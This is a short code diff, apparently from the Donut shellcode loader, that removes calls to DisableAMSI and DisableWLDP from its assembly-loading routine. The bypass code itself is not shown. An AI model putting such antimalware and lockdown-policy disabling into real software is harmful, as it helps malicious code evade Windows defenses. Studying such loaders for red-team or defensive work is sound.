@@ -36,7 +36,7 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     SAFEARRAYBOUND  sab;
     SAFEARRAY       *sa;
     DWORD           i;
-    BOOL            loaded=FALSE, loadable, disabled;
+    BOOL            loaded=FALSE, loadable;
     PBYTE           p;
     
     if(inst->type == DONUT_INSTANCE_PIC) {
@@ -118,16 +118,6 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
           pa->iu, (REFIID)&inst->xIID_AppDomain, (LPVOID)&pa->ad);
           
         if(SUCCEEDED(hr)) {
-          // Try to disable AMSI
-          disabled = DisableAMSI(inst);
-          DPRINT("DisableAMSI %s", disabled ? "OK" : "FAILED");
-          if(!disabled) return FALSE;
-          
-          // Try to disable WLDP
-          disabled = DisableWLDP(inst);
-          DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
-          if(!disabled) return FALSE;
-          
           sab.lLbound   = 0;
           sab.cElements = mod->len;
           sa = inst->api.SafeArrayCreate(VT_UI1, 1, &sab);
